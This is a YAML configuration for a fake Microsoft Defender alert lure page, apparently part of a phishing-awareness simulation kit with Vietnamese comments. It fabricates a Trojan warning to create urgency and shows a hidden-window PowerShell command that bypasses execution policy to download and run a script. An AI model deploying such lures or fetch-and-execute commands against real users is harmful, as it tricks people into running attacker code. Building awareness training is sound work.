# ============================================================
# KỊCH BẢN 2: Microsoft Defender Security Alert
# Giả mạo cảnh báo bảo mật từ Windows Defender / Microsoft
# Tạo cảm giác khẩn cấp để người dùng hành động nhanh
# ============================================================

type: alert
template: lures/microsoft_alert.html
route: /security-alert

payload:
  # JS tracker runs in browser; PS1 command shown in overlay for copy-paste
  script: "default.js"

content:
  title: "Windows Defender — Cảnh Báo Bảo Mật Nghiêm Trọng"
  threat_name: "Trojan:Win32/Wacatac.H!ml"
  threat_level: "NGHIÊM TRỌNG"
  message: "Máy tính của bạn đã bị nhiễm phần mềm độc hại. Cần thực hiện ngay lập tức để bảo vệ dữ liệu và tài khoản của bạn."
  error_code: "0x80073b01"
  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/awareness.ps1' -UseBasicParsing).Content\""

styles:
  theme: "microsoft"
  primary_color: "#0078D4"
  danger_color: "#D13438"
